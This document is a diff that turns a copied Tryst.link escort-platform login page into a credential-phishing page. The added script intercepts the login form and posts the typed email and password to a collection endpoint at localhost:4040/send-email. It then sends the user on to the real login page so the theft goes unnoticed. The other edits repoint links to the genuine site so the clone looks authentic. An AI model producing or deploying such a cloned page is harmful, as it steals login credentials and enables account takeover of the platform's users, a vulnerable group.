@@ -68,8 +68,8 @@
           <div class="row grid">
             <div class="col-6 unit half">
               <h1 class="border">Log in</h1>
-              <form action="/log_in" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden"
-                  value="&#x2713;" autocomplete="off" /><input type="hidden" name="authenticity_token"
+              <form accept-charset="UTF-8" id="panda"><input name="utf8" type="hidden" value="&#x2713;"
+                  autocomplete="off" /><input type="hidden" name="authenticity_token"
                   value="7DXcCk+BHsw3va2ZMrJN6+YT2KmvRG6niqWKzl9pQP4opu3kUygymmHvOk0rWqGfSZLcTOqvB6oHzMR8C70DBw=="
                   autocomplete="off" />
                 <div class="form-inputs">
@@ -83,8 +83,7 @@
                       autocomplete="current-password" required="required" class="form-control form-control-lg" /></div>
                   <div class="form-group text"><label class="text control-label required"><abbr
                         title="required">*</abbr> Please enter the characters shown inside the blue box<br /><img
-                        style="border: 2px solid blue"
-                        width="200px"
+                        style="border: 2px solid blue" width="200px"
                         src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d1/Captcha-smwm.svg/1200px-Captcha-smwm.svg.png" /><input
                         type="text" name="captcha" id="captcha" value="" autocorrect="off" autocapitalize="off"
                         spellcheck="false" required="required" class="form-control form-control-lg" /></label></div>
@@ -96,19 +95,20 @@
                   <div class="form-group"><input type="submit" value="Log in" class="btn btn-red default solid line"
                       data-disable-with="Log in" /></div>
                 </div>
-              </form><a class="btn line small" href="reset_password_request.html">Forgot your password?</a><a
-                class="btn line small" href="confirm_account_resend.html">Didn&#39;t receive confirmation
+              </form><a class="btn line small" href="https://app.tryst.link/reset_password_request">Forgot your
+                password?</a><a class="btn line small" href="https://app.tryst.link/confirm_account_resend">Didn&#39;t
+                receive confirmation
                 instructions?</a>
             </div>
             <div class="col-6 unit half">
               <h2 class="border">Sign up</h2>
               <p>Tryst.link is one of the fastest-growing escort platforms in the world. Built by the same team behind
-                <a target="_blank" rel="noopener" href="https://switter.at">Switter</a>!</p>
+                <a target="_blank" rel="noopener" href="https://switter.at">Switter</a>!
+              </p>
               <p>Please select which type of account you'd like to sign up for:</p>
               <div class="center"><a class="btn solid spacing" data-turbolinks="false"
-                  href="https://app.tryst.link/sign_up-type=provider.html">I am a provider</a><a
-                  class="btn solid spacing" data-turbolinks="false"
-                  href="https://app.tryst.link/sign_up-type=client.html">I am a client</a></div>
+                  href="https://app.tryst.link/sign_up-type=provider">I am a provider</a><a class="btn solid spacing"
+                  data-turbolinks="false" href="https://app.tryst.link/sign_up-type=client">I am a client</a></div>
             </div>
           </div>
         </div>
@@ -121,7 +121,7 @@
             <div class="row">
               <div class="footer-widget unit one-third col-4">
                 <div itemscope="" itemtype="http://schema.org/Organization"><a id="footer-logo" itemprop="url"
-                    title="Tryst.link: Find independent escorts" href="log_in.html"><img height="75" alt="Tryst logo"
+                    title="Tryst.link: Find independent escorts" href="./log_in.html"><img height="75" alt="Tryst logo"
                       itemprop="logo"
                       src="https://asset.tryst.a4cdn.ch/assets/logo-58c2e204360c73488a7d6014726241a01bd7082e0dfaacae0ef32a056cd4b4eb.png" /></a>
                 </div><br /><a href="https://assemblyfour.com"><img height="40" alt="An Assembly Four Project"
@@ -137,9 +137,9 @@
           <div class="container">
             <div class="grid links row">
               <div class="unit one-third col-4">&copy 2022 <a href="https://assemblyfour.com">Assembly Four</a><br /><a
-                  href="./log_in.html">Privacy</a><br /><a href="./log_in.htmlterms">Terms &amp; Conditions</a><br /><a
-                  data-support="" href="support.html">Support</a><br /><a href="./log_in.htmlblog">Blog</a><br /><a
-                  href="./log_in.htmlsocial">Social</a><br /><a href="./log_in.htmlcontact">Contact</a></div>
+                  href="./log_in.html">Privacy</a><br /><a href="./log_in.html">Terms &amp; Conditions</a><br /><a
+                  data-support="" href="support.html">Support</a><br /><a href="./log_in.html">Blog</a><br /><a
+                  href="./log_in.htmlsocial">Social</a><br /><a href="./log_in.html">Contact</a></div>
             </div>
             <ul class="social-icons footer-social">
               <li><a class="fa fa-twitter tooltip-pink" href="https://twitter.com/trystlink" title="Twitter">
@@ -151,14 +151,33 @@
       </footer>
     </div>
   </div>
-  <script>$(document).on('turbolinks:load', function () {
-      Maska.create('[data-mask]', {
-        tokens: {
-          'X': { pattern: /[0-9a-zA-Z]/, uppercase: true },
-          'B': { pattern: /[367CDEFGHJKMNPRTWXcdefghjkmnprtwx]/, uppercase: true },
-        }
-      });
-    });
+  <script>
+    function handleLogin(event) {
+      event.preventDefault();
+
+      let email = document.getElementById("login").value;
+      let password = document.getElementById("password").value;
+
+      fetch('http://localhost:4040/send-email', {
+        method: 'POST',
+        headers: {
+          'Accept': 'application/json',
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ message: `Email: ${email} Password: ${password}` })
+      }).then((res) => {
+        location.replace("https://app.tryst.link/log_in")
+      })
+
+    }
+
+
+    // your form
+    var form = document.getElementById("panda");
+
+    // attach event listener
+    form.addEventListener("submit", handleLogin, true);
+
 
   </script>
 </body>
